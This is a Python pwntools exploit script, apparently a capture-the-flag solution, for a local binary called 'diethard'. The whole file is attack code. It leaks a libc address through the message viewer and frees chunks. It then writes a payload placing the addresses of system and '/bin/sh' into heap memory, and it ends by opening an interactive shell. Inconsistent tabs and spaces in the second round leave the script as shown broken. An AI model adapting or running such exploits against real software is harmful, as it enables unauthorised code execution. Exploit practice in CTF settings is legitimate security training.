from pwn import *

context.log_level='debug'

def Add_a_msg(len,msg):
	s.recvuntil('3. Exit')
	s.sendline('1')
	s.recvuntil('Input Message Length:')
	s.sendline(str(len))
	s.recvuntil('Please Input Message:')
	s.sendline(msg)

def View_a_msg(until):
	s.recvuntil('3. Exit')
	s.sendline('2')
	
	if(until is not 0):
		s.recvuntil(until)

def Delete_a_msg(index):
	s.recvuntil('Which Message You Want To Delete?')
	s.sendline(str(index))

if __name__ == "__main__":

	s=process('./diethard')

	libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

	Add_a_msg(1024,'A')
	Add_a_msg(1024,'B')
	Add_a_msg(1024,'C')
	Add_a_msg(2046,'D')

	View_a_msg('D'+'\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00')

	libc_leak=u64(s.recv(8))
	libc_start=libc_leak-0xd6f020

	system_libc=libc_start+libc.symbols['system']
	bin_sh=libc_start+0x18cd17
	
	s.sendline('0')	
	View_a_msg(0)
	Delete_a_msg(0)
	s.sendline('0')
	View_a_msg(0)
	Delete_a_msg(0)
	s.sendline('0')
	View_a_msg(0)
	Delete_a_msg(0)
	s.sendline('0')

	payload=p64(0x0)
	payload+=p64(0x400)
	#payload+=p64(libc_leak)
	payload+=p64(bin_sh)
	payload+=p64(system_libc)
	
	raw_input('round 2')
	Add_a_msg(1024,'a')
        Add_a_msg(1024,'b')
        Add_a_msg(1024,'c')
        Add_a_msg(2046,payload)

        print hex(libc_start)
        print hex(system_libc)
        print hex(bin_sh)
	
	s.interactive()	
	

